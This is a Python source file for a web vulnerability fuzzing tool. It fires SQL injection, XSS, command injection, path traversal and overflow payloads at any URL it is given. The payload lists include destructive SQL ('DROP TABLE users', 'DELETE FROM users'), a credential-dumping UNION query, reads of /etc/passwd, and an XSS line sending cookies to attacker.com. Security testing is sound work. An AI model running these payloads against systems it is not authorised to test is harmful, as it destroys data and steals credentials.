"""
Ashley Okoro
Network Vulnerability Fuzz Testing Tool

Features:
- SQL Injection fuzzing
- XSS payload fuzzing
- Buffer overflow testing
- Format string vulnerability testing
- Command injection fuzzing
- Path traversal testing
- Header injection testing

"""

import requests
import argparse
import json
import time
import random
import string
from datetime import datetime
from urllib.parse import urljoin, quote
import sys
from typing import List, Dict, Any
from concurrent.futures import ThreadPoolExecutor, as_completed


class Colors:
    """ANSI color codes for terminal output."""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'


class FuzzPayloads:
    """Collection of fuzzing payloads for different vulnerability types."""

    # SQL Injection Payloads
    SQL_INJECTION = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1--",
        "1' ORDER BY 1--+",
        "1' ORDER BY 2--+",
        "1' ORDER BY 3--+",
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "1' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,username,password FROM users--",
        "'; DROP TABLE users--",
        "'; DELETE FROM users WHERE '1'='1",
        "1; EXEC sp_msforeachtable 'DROP TABLE ?'--",
    ]

    # XSS Payloads
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')>",
        "javascript:alert('XSS')",
        "<script>document.location='http://attacker.com/?cookie='+document.cookie</script>",
        "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "<IMG SRC=\"javascript:alert('XSS');\">",
        "<IMG SRC=javascript:alert('XSS')>",
        "<IMG SRC=JaVaScRiPt:alert('XSS')>",
        "<IMG SRC=`javascript:alert(\"XSS\")`>",
    ]

    # Command Injection Payloads
    COMMAND_INJECTION = [
        "; ls -la",
        "| ls -la",
        "& ls -la",
        "`ls -la`",
        "$(ls -la)",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; whoami",
        "| whoami",
        "; id",
        "| id",
        "; ping -c 4 127.0.0.1",
        "| ping -c 4 127.0.0.1",
        "; sleep 5",
        "| sleep 5",
    ]

    # Path Traversal Payloads
    PATH_TRAVERSAL = [
        "../",
        "../../",
        "../../../",
        "../../../../",
        "../../../../../",
        "..%2F",
        "..%252F",
        "..\\",
        "..%5C",
        "..%255C",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../windows/win.ini",
        "../../../../windows/win.ini",
    ]

    # Buffer Overflow Payloads
    BUFFER_OVERFLOW = [
        "A" * 100,
        "A" * 500,
        "A" * 1000,
        "A" * 5000,
        "A" * 10000,
        "%s" * 100,
        "%x" * 100,
        "%n" * 100,
    ]

    # Header Injection Payloads
    HEADER_INJECTION = [
        "test\r\nX-Injected-Header: injected",
        "test\nX-Injected-Header: injected",
        "test\rX-Injected-Header: injected",
        "test%0d%0aX-Injected-Header: injected",
        "test%0aX-Injected-Header: injected",
    ]

    # Format String Payloads
    FORMAT_STRING = [
        "%s%s%s%s%s%s%s%s%s%s",
        "%x%x%x%x%x%x%x%x%x%x",
        "%n%n%n%n%n%n%n%n%n%n",
        "%p%p%p%p%p%p%p%p%p%p",
        "%.1000d",
        "%1000000s",
    ]


class VulnerabilityFuzzer:
    """Main fuzzing engine for testing web application vulnerabilities."""

    def __init__(self, target_url: str, timeout: int = 10, threads: int = 5):
        
        self.target_url = target_url
        self.timeout = timeout
        self.threads = threads
        self.vulnerabilities = []
        self.requests_sent = 0
        self.start_time = None

    def print_banner(self):
        """Print tool banner."""
        banner = f"""
{Colors.BOLD}    Network Vulnerability Fuzz Testing Tool

Target: {Colors.YELLOW}{self.target_url}{Colors.END}
Timeout: {self.timeout}s
Threads: {self.threads}
Start Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

"""
        print(banner)

    def log_vulnerability(self, vuln_type: str, endpoint: str, payload: str, response: requests.Response):
        """Log discovered vulnerability."""
        vuln = {
            'type': vuln_type,
            'endpoint': endpoint,
            'payload': payload,
            'status_code': response.status_code,
            'response_time': response.elapsed.total_seconds(),
            'response_length': len(response.content),
            'timestamp': datetime.now().isoformat()
        }
        self.vulnerabilities.append(vuln)

        # Print to console
        print(f"{Colors.RED}[!] VULNERABILITY FOUND: {vuln_type}{Colors.END}")
        print(f"    Endpoint: {endpoint}")
        print(f"    Payload: {payload[:100]}")
        print(f"    Status: {response.status_code}")
        print()

    def test_sql_injection(self, endpoints: List[str]) -> int:
        """
        Test for SQL injection vulnerabilities.

        Returns:
            Number of vulnerabilities found
        """
        print(f"{Colors.BLUE}[*] Testing SQL Injection...{Colors.END}")
        found = 0

        for endpoint in endpoints:
            for payload in FuzzPayloads.SQL_INJECTION:
                try:
                    # Test GET parameter
                    url = f"{urljoin(self.target_url, endpoint)}?id={quote(payload)}"
                    response = requests.get(url, timeout=self.timeout, verify=False)
                    self.requests_sent += 1

                    # Check for SQL error messages
                    error_indicators = [
                        'sql', 'mysql', 'sqlite', 'postgresql', 'oracle',
                        'syntax error', 'database error', 'query failed',
                        'mysql_fetch', 'pg_query', 'sqlite3'
                    ]

                    if any(indicator in response.text.lower() for indicator in error_indicators):
                        self.log_vulnerability('SQL Injection', endpoint, payload, response)
                        found += 1

                    # Test POST parameter
                    response = requests.post(
                        urljoin(self.target_url, endpoint),
                        data={'input': payload},
                        timeout=self.timeout,
                        verify=False
                    )
                    self.requests_sent += 1

                    if any(indicator in response.text.lower() for indicator in error_indicators):
                        self.log_vulnerability('SQL Injection (POST)', endpoint, payload, response)
                        found += 1

                except requests.exceptions.RequestException:
                    pass

        return found

    def test_xss(self, endpoints: List[str]) -> int:
        """
        Test for XSS vulnerabilities.

        Returns:
            Number of vulnerabilities found
        """
        print(f"{Colors.BLUE}[*] Testing XSS...{Colors.END}")
        found = 0

        for endpoint in endpoints:
            for payload in FuzzPayloads.XSS_PAYLOADS:
                try:
                    # Test reflected XSS
                    url = f"{urljoin(self.target_url, endpoint)}?search={quote(payload)}"
                    response = requests.get(url, timeout=self.timeout, verify=False)
                    self.requests_sent += 1

                    # Check if payload is reflected unescaped
                    if payload in response.text:
                        self.log_vulnerability('XSS (Reflected)', endpoint, payload, response)
                        found += 1

                    # Test POST XSS
                    response = requests.post(
                        urljoin(self.target_url, endpoint),
                        data={'comment': payload},
                        timeout=self.timeout,
                        verify=False
                    )
                    self.requests_sent += 1

                    if payload in response.text:
                        self.log_vulnerability('XSS (POST)', endpoint, payload, response)
                        found += 1

                except requests.exceptions.RequestException:
                    pass

        return found

    def test_command_injection(self, endpoints: List[str]) -> int:
        """Test for command injection vulnerabilities."""
        print(f"{Colors.BLUE}[*] Testing Command Injection...{Colors.END}")
        found = 0

        for endpoint in endpoints:
            for payload in FuzzPayloads.COMMAND_INJECTION:
                try:
                    response = requests.post(
                        urljoin(self.target_url, endpoint),
                        data={'cmd': payload},
                        timeout=self.timeout,
                        verify=False
                    )
                    self.requests_sent += 1

                    # Check for command output indicators
                    indicators = ['root:', 'bin/bash', 'uid=', 'gid=', 'groups=']
                    if any(indicator in response.text for indicator in indicators):
                        self.log_vulnerability('Command Injection', endpoint, payload, response)
                        found += 1

                except requests.exceptions.RequestException:
                    pass

        return found

    def test_path_traversal(self, endpoints: List[str]) -> int:
        """Test for path traversal vulnerabilities."""
        print(f"{Colors.BLUE}[*] Testing Path Traversal...{Colors.END}")
        found = 0

        for endpoint in endpoints:
            for payload in FuzzPayloads.PATH_TRAVERSAL:
                try:
                    url = f"{urljoin(self.target_url, endpoint)}?file={quote(payload)}"
                    response = requests.get(url, timeout=self.timeout, verify=False)
                    self.requests_sent += 1

                    # Check for sensitive file content
                    indicators = ['root:', '[boot loader]', '[extensions]']
                    if any(indicator in response.text for indicator in indicators):
                        self.log_vulnerability('Path Traversal', endpoint, payload, response)
                        found += 1

                except requests.exceptions.RequestException:
                    pass

        return found

    def test_buffer_overflow(self, endpoints: List[str]) -> int:
        """Test for buffer overflow vulnerabilities."""
        print(f"{Colors.BLUE}[*] Testing Buffer Overflow...{Colors.END}")
        found = 0

        for endpoint in endpoints:
            for payload in FuzzPayloads.BUFFER_OVERFLOW:
                try:
                    response = requests.post(
                        urljoin(self.target_url, endpoint),
                        data={'input': payload},
                        timeout=self.timeout,
                        verify=False
                    )
                    self.requests_sent += 1

                    # Check for errors or unusual responses
                    if response.status_code == 500 or 'error' in response.text.lower():
                        self.log_vulnerability('Buffer Overflow', endpoint, f"{len(payload)} bytes", response)
                        found += 1

                except requests.exceptions.RequestException:
                    pass

        return found

    def generate_report(self, output_file: str = None):
        """Generate vulnerability report."""
        duration = time.time() - self.start_time

        report = {
            'target': self.target_url,
            'scan_date': datetime.now().isoformat(),
            'duration_seconds': round(duration, 2),
            'requests_sent': self.requests_sent,
            'vulnerabilities_found': len(self.vulnerabilities),
            'vulnerabilities': self.vulnerabilities
        }

        # Print summary
        print(f"{Colors.BOLD}Scan Complete{Colors.END}")
        print(f"Duration: {duration:.2f}s")
        print(f"Requests Sent: {self.requests_sent}")
        print(f"Vulnerabilities Found: {Colors.RED}{len(self.vulnerabilities)}{Colors.END}")

        if self.vulnerabilities:
            print(f"\n{Colors.RED}Vulnerability Summary:{Colors.END}")
            vuln_types = {}
            for vuln in self.vulnerabilities:
                vuln_type = vuln['type']
                vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1

            for vuln_type, count in vuln_types.items():
                print(f"  - {vuln_type}: {count}")

        # Save to file
        if output_file:
            with open(output_file, 'w') as f:
                json.dump(report, f, indent=2)
            print(f"\n{Colors.GREEN}Report saved to: {output_file}{Colors.END}")

        return report


def main():
    """Main execution function."""
    parser = argparse.ArgumentParser(
        description='Network Vulnerability Fuzz Testing Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python fuzz_testing.py --url http://localhost:5000 --type all
  python fuzz_testing.py --url http://target.com --type sql --output report.json
  python fuzz_testing.py --url http://target.com --type xss --endpoints /login /search
        """
    )

    parser.add_argument('--url', required=True, help='Target URL')
    parser.add_argument(
        '--type',
        choices=['all', 'sql', 'xss', 'cmd', 'path', 'buffer'],
        default='all',
        help='Type of vulnerability to test'
    )
    parser.add_argument('--endpoints', nargs='+', default=['/'], help='Endpoints to test')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds')
    parser.add_argument('--threads', type=int, default=5, help='Number of threads')
    parser.add_argument('--output', help='Output report file (JSON)')

    args = parser.parse_args()

    # Disable SSL warnings
    requests.packages.urllib3.disable_warnings()

    # Initialize fuzzer
    fuzzer = VulnerabilityFuzzer(args.url, args.timeout, args.threads)
    fuzzer.print_banner()
    fuzzer.start_time = time.time()

    # Run tests
    total_found = 0
    if args.type in ['all', 'sql']:
        total_found += fuzzer.test_sql_injection(args.endpoints)

    if args.type in ['all', 'xss']:
        total_found += fuzzer.test_xss(args.endpoints)

    if args.type in ['all', 'cmd']:
        total_found += fuzzer.test_command_injection(args.endpoints)

    if args.type in ['all', 'path']:
        total_found += fuzzer.test_path_traversal(args.endpoints)

    if args.type in ['all', 'buffer']:
        total_found += fuzzer.test_buffer_overflow(args.endpoints)

    # Generate report
    fuzzer.generate_report(args.output)

    return 0 if total_found == 0 else 1


if __name__ == '__main__':
    sys.exit(main())

